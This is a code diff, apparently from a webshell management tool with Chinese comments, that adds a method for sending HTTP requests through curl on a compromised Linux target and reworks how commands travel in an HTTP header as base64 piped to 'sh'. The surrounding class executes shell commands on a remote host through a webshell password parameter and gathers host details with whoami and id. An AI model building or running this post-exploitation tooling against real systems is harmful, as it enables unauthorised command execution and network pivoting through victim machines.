@@ -15,6 +15,7 @@ from ..core.base import (
     OptionGroup,
     DirectoryEntry,
     BasicInfoEntry,
+    HttpResponseDict,
     get_http_client,
 )
 
@@ -287,7 +288,7 @@ class LinuxCmdOneLiner:
                     name=name,
                     permission=perm,
                     filesize=int(filesize),
-                    entry_type=filetype
+                    entry_type=t.cast(t.Literal["dir", "file", "link-dir", "link-file", "unknown"], filetype)
                 )
             )
         return result
@@ -462,6 +463,103 @@ class LinuxCmdOneLiner:
         """得到发送字节支持的TCP方法"""
         return []
 
+    async def send_http_request(
+        self,
+        url: str,
+        method: str = "GET",
+        headers: t.Optional[t.Dict[str, str]] = None,
+        params: t.Optional[t.Dict[str, t.Any]] = None,
+        data: t.Optional[t.Union[str, bytes]] = None,
+    ) -> "HttpResponseDict":
+        """发送HTTP请求"""
+        import json
+        import base64
+        from urllib.parse import urlencode
+        from ..core.base import HttpResponseDict
+
+        # 检查curl是否存在
+        curl_check = await self.submit(["which", "curl"])
+        if not curl_check.strip():
+            raise exceptions.TargetError("目标系统未安装curl命令")
+
+        # 构建curl命令
+        cmd_parts = ["curl", "-s", "-i"]
+        cmd_parts.extend(["-X", method])
+
+        # 添加headers
+        if headers:
+            for key, value in headers.items():
+                cmd_parts.extend(["-H", f"{key}: {value}"])
+
+        # 构建URL和查询参数
+        full_url = url
+        if params:
+            query_string = urlencode(params)
+            full_url = f"{url}?{query_string}"
+
+        # 添加data
+        if data is not None:
+            if isinstance(data, bytes):
+                data_b64 = base64.b64encode(data).decode()
+                temp_check = await self.submit(["which", "mktemp"])
+                if temp_check.strip():
+                    temp_file = "/tmp/curl_data_$(mktemp -u)"
+                    upload_cmd = f"echo {data_b64} | base64 -d > {temp_file}"
+                    await self.submit(upload_cmd)
+                    cmd_parts.extend(["--data-binary", f"@{temp_file}"])
+                else:
+                    try:
+                        data_str = data.decode('utf-8')
+                        cmd_parts.extend(["--data", data_str])
+                    except UnicodeDecodeError:
+                        cmd_parts.extend(["--data", data_b64])
+            else:
+                cmd_parts.extend(["--data", data])
+
+        cmd_parts.append(full_url)
+
+        # 执行命令
+        cmd_str = " ".join([shlex.quote(part) for part in cmd_parts])
+        output = await self.submit(cmd_str)
+
+        # 解析输出
+        lines = output.splitlines()
+        if not lines:
+            raise exceptions.NetworkError("HTTP请求无响应")
+
+        # 解析状态行
+        status_line = lines[0]
+        if not status_line.startswith("HTTP/"):
+            raise exceptions.NetworkError(f"无效的HTTP响应: {status_line}")
+        try:
+            status_code = int(status_line.split()[1])
+        except (IndexError, ValueError):
+            raise exceptions.NetworkError(f"无法解析状态码: {status_line}")
+
+        # 解析headers和body
+        headers_dict = {}
+        body_lines = []
+        in_body = False
+        for line in lines[1:]:
+            if not in_body:
+                if line.strip() == "":
+                    in_body = True
+                    continue
+                if ":" in line:
+                    key, value = line.split(":", 1)
+                    headers_dict[key.strip()] = value.strip()
+            else:
+                body_lines.append(line)
+
+        body = "\n".join(body_lines)
+        body_bytes = body.encode() if body else b""
+
+        return {
+            "status_code": status_code,
+            "headers": headers_dict,
+            "body": body_bytes
+        }
+
     async def get_basicinfo(self):
         # TODO: 多加一点命令
         cmds = ["uname -a", "whoami", "id", "groups", "pwd"]
@@ -533,7 +631,11 @@ class LinuxCmdOneLiner:
             if self.password_method in ["GET", "HEAD"]:
                 kwargs["params"][self.password] = payload
             elif self.password_method == "HEADER":
-                kwargs["headers"][self.password] = f"echo {base64.b64encode(payload.encode()).decode()} | base64 -d | sh"
+                if isinstance(payload, bytes):
+                    payload_b64 = base64.b64encode(payload).decode()
+                else:
+                    payload_b64 = base64.b64encode(payload.encode()).decode()
+                kwargs["headers"][self.password] = f"echo {payload_b64} | base64 -d | sh"
             else:
                 kwargs["data"][self.password] = payload
             response = await self.client.request(
